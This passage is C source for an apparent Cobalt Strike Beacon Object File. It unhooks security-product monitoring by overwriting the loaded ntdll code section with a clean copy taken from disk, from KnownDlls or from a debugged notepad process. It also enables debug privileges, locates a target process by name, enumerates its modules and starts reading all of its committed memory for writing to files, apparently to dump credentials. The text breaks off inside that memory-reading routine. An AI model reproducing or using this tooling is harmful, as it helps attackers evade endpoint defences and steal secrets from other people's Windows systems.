#include <windows.h>
#include "beacon.h"

#define MAX_PATH 260
#define MAX_MODULES 1024
#define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
#define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)
#define SECTION_MAP_READ 0x0004
#define OBJ_CASE_INSENSITIVE 0x00000040
#define process_basic_information_size 48
#define peb_offset 0x8
#define ldr_offset 0x18
#define inInitializationOrderModuleList_offset 0x30
#define ProcessBasicInformation 0
#define flink_dllbase_offset 0x20
#define flink_buffer_offset 0x50
#define zero_memory = 0x00000008
#define max_string_length 1024
#define commandline_offset 0x68
#define processparameters_offset 0x20
#define flink_buffer_fulldllname_offset 0x40


// Structs
typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
    int size;
} ModuleInformation;

typedef struct {
    char filename[20];
    unsigned char* content;
    void* address;
    size_t size;
} MemFile;

typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


// Functions
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextProcess(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE, PVOID, LPVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH,LPBOOL);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DebugActiveProcessStop(DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);


void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = NULL;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = NULL;
    p->SecurityQualityOfService = NULL;
}

UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    int data_len = MyWcsLen(str);
    us.Buffer = (PWSTR)str;
    us.Length = data_len * sizeof(WCHAR); // Using lstrlenW for length
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}


//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 8, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error \n");
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


char* ConvertUnicodeToAnsi(HANDLE hHeap, WCHAR* unicodeStr) {
    int bufferSize = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to calculate ANSI string size.\n");
        return NULL;
    }
    char* ansiStr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    if (ansiStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for ANSI string.\n");
        return NULL;
    }
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, unicodeStr, -1, ansiStr, bufferSize, NULL, NULL);
    return ansiStr;    
}


char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 256);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 256, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading remote memory. NTSTATUS: 0x%X\n", ntstatus);
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
    }
    WCHAR* unicodeStr = (WCHAR*)buff;

    char* ansiStr = ConvertUnicodeToAnsi(hHeap, unicodeStr);
    if (ansiStr == NULL) {
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        return;
    }

    KERNEL32$HeapFree(hHeap, 0, buff);
    return ansiStr;
}


int MyWcsLen(LPCWSTR str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


void *MyMemSet(void *ptr, int value, size_t num) {
    unsigned char *p = (unsigned char *)ptr;
    while (num--) {
        *p++ = (unsigned char)value;
    }
    return ptr;
}


void* GetModuleAddr() {
    HANDLE process_handle = (HANDLE) -1;
    
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }

    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        if(MyStrCmp(base_dll_name, "ntdll.dll") == 0){
            return dll_base;
        }
        // DLL full path
        BeaconPrintf(CALLBACK_OUTPUT, "[+] base_dll_name %s\n", base_dll_name); 
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    return 0;
}


int* GetTextSectionInfo(LPVOID ntdll_address) {
    SIZE_T bytesRead;
    HANDLE hProcess = (HANDLE) -1;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading e_lfanew\n");
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading SizeOfCode\n");
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading BaseOfCode\n");
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    HANDLE hFile = KERNEL32$CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileA\n");
    }

    // CreateFileMappingA
    HANDLE hSection = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hSection == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileMappingA\n");
        KERNEL32$CloseHandle(hFile);
    }

    // MapViewOfFile
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hFile);
    }

    // Close handles
    if (!KERNEL32$CloseHandle(hFile) || !KERNEL32$CloseHandle(hSection)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CloseHandle\n");
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromKnownDlls() {
    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING us;
    us = InitUnicodeString(dll_name);

    // Initialize OBJECT_ATTRIBUTES for the section object
    OBJECT_ATTRIBUTES obj_attr;
    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);

    // Open the section for the DLL
    HANDLE hSection = NULL;
    NTSTATUS status = NTDLL$NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
    }

    // Map the section into memory
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        NTDLL$NtClose(hSection);
    }

    // Close the section handle
    status = NTDLL$NtClose(hSection);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtClose. NTSTATUS: 0x%X\n", status);
    }

    return pNtdllBuffer;
}


// Translated function
LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL createprocess_res;

    // Initialize structures
    MyMemSet(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFOA);
    MyMemSet(&pi, 0, sizeof(pi));

    // Create process with DEBUG_PROCESS flag
    createprocess_res = KERNEL32$CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CreateProcess\n");
    }

    void* localNtdllHandle = GetModuleAddr();
    int* result = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);

    // Allocate memory for the buffer to hold the ntdll text section
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    BYTE* ntdllBuffer = (BYTE*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, localNtdllTxtSize);
    
    if (!ntdllBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error allocating memory for ntdll buffer\n");
    }

    // Read the ntdll text section from the target process
    SIZE_T bytesRead;
    BOOL readprocmem_res = KERNEL32$ReadProcessMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (!readprocmem_res || bytesRead != localNtdllTxtSize) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading process memory\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    // Stop debugging the process and terminate it
    BOOL debugstop_res = KERNEL32$DebugActiveProcessStop(pi.dwProcessId);
    BOOL terminateproc_res = KERNEL32$TerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || !terminateproc_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    // Close process and thread handles
    BOOL closehandle_proc = KERNEL32$CloseHandle(pi.hProcess);
    BOOL closehandle_thread = KERNEL32$CloseHandle(pi.hThread);
    if (!closehandle_proc || !closehandle_thread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CloseHandle\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    return pNtdllBuffer;
}


void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    DWORD dwOldProtection;

    // Change protection to PAGE_EXECUTE_WRITECOPY
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
        return;  // Exit function on failure
    }
    
    // Manually copy the memory (replace memcpy)
    unsigned char *src = (unsigned char *)unhookedNtdllTxt;
    unsigned char *dst = (unsigned char *)localNtdllTxt;
    for (SIZE_T i = 0; i < localNtdllTxtSize; i++) {
        dst[i] = src[i];
    }

    // Restore original memory protection
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (dwOldProtection)\n");
        return;

    }
}


void ReplaceLibrary(const char* option){
    long long unhookedNtdllTxt = 0;
    LPVOID unhookedNtdllHandle;
    const int offset_mappeddll = 4096;

    if (MyStrCmp(option, "disk") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
        unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else if (MyStrCmp(option, "knowndlls") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
        unhookedNtdllHandle = MapNtdllFromKnownDlls();
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);

    }
    else if (MyStrCmp(option, "debugproc") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
        unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else{
        return;
    }

    // Replace
    void* localNtdllHandle = GetModuleAddr();
    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;

    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);

    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}
//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////


void EnableDebugPrivileges() {
    HANDLE currentProcess = (HANDLE) -1;
    HANDLE tokenHandle = NULL;
    NTSTATUS ntstatus = NTDLL$NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20;
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = SE_PRIVILEGE_ENABLED;
    ntstatus = NTDLL$NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES_STRUCT), NULL, NULL);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X\n", ntstatus);
        NTDLL$NtClose(tokenHandle);
        return;
    }

    if (tokenHandle != NULL) {
        NTDLL$NtClose(tokenHandle);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Debug privileges enabled successfully.\n");
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB 
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);

    // ProcessParameters->CommandLine
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    NTSTATUS status;
    while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_counter) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // Get PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    KERNEL32$HeapFree(hHeap, 0, pbi_addr);
    int module_counter = 0;
    ModuleInformation* module_list = (ModuleInformation*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ModuleInformation) * MAX_MODULES);
    if (!module_list) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for module_list.");
        return;
    }

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        // DLL full path
        void* full_dll_name_addr = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        char* full_dll_path = ReadRemoteWStr(process_handle, full_dll_name_addr);
        if(dll_base != 0){
            ModuleInformation module_info;
            module_info.dll_base = dll_base;
            module_info.size = 0;
            int i;
            for (i = 0; i < MAX_PATH - 1 && base_dll_name[i] != '\0'; i++) {
                module_info.base_dll_name[i] = base_dll_name[i];
            }
            module_info.base_dll_name[i] = '\0';
            int j;
            for (j = 0; j < MAX_PATH - 1 && full_dll_path[j] != '\0'; j++) {
                module_info.full_dll_path[j] = full_dll_path[j];
            }
            module_info.full_dll_path[j] = '\0';
            module_list[module_counter] = module_info;
            module_counter++;
        }       
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    // Return the module list
    *out_module_counter = module_counter;
    return module_list;
}


ModuleInformation find_module_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return moduleInformationList[i];
        }
    }
    return moduleInformationList[0]; // Change to empty module
}


int find_index_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return i;
        }
    }
    return -1;
}


int MyStrCmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}


void MyIntToHexStr(long long value, char* buffer) {
    int i;
    for (i = 15; i >= 0; i--) {
        int nibble = value & 0xF;
        if (nibble < 10) {
            buffer[i] = '0' + nibble;
        } else {
            buffer[i] = 'A' + (nibble - 10);
        }
        value >>= 4;
    }
    buffer[16] = '\0';
}


void MyStrcpy(char* dest, const char* src, size_t max_len) {
    size_t i = 0;
    while (i < max_len - 1 && src[i] != '\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
}


int MyStrLen(char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN debug) {
    // CreateFile
    HANDLE hFile = KERNEL32$CreateFileA(
        file_path,                // File path
        GENERIC_WRITE,            // Open for writing
        0,                        // Do not share
        NULL,                     // Default security
        CREATE_ALWAYS,            // Overwrite the file if it exists
        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
        NULL                      // No template file
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
        return;
    }

    // WriteFile
    DWORD bytesWritten;
    BOOL result = KERNEL32$WriteFile(
        hFile,                    // Handle to the file
        data,                     // Pointer to the data to write
        data_len,                 // Length of the data (in bytes)
        &bytesWritten,            // Number of bytes written
        NULL                      // Overlapped not used
    );
    if (!result) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
    } else {
        if(debug){
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
        }
    }

    // Close handle
    KERNEL32$CloseHandle(hFile);
}


MemFile* ReadMemReg(HANDLE hProcess, int* memfile_countOutput){
    // Initialize variables
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;    
    int memfile_count = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();  
    MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);

    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            SIZE_T regionSize = mbi.RegionSize;
            PVOID buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
            SIZE_T bytesRead = 0;
            NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buffer, regionSize, &bytesRead);
